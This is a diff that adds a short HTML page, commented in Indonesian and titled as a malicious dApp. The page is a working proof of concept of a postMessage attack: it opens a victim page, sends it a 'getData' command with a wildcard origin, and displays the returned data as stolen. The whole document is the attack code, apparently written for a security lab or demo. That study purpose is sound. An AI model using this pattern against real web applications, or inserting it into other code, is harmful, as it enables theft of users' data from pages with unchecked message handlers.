@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head><title>DApp Jahat</title></head>
+<body>
+    <h2>Situs Penyerang</h2>
+    <button onclick="curiData()">Curi Data DApp Korban</button>
+    <div id="hasil" style="margin-top:20px; color:red;"></div>
+
+    <script>
+        function curiData() {
+            // Dalam skenario nyata, penyerang harus tahu window mana yang dituju.
+            // Di sini kita asumsikan window target sudah terbuka.
+            const target = window.open("korban.html");
+
+            setTimeout(() => {
+                // Mengirim perintah ke jendela korban
+                target.postMessage({ action: "getData" }, "*"); 
+            }, 1000);
+        }
+
+        // Menerima data yang dicuri
+        window.addEventListener("message", (event) => {
+            document.getElementById("hasil").innerText = 
+                "DATA BERHASIL DICURI: " + JSON.stringify(event.data.data);
+        });
+    </script>
+</body>
+</html>
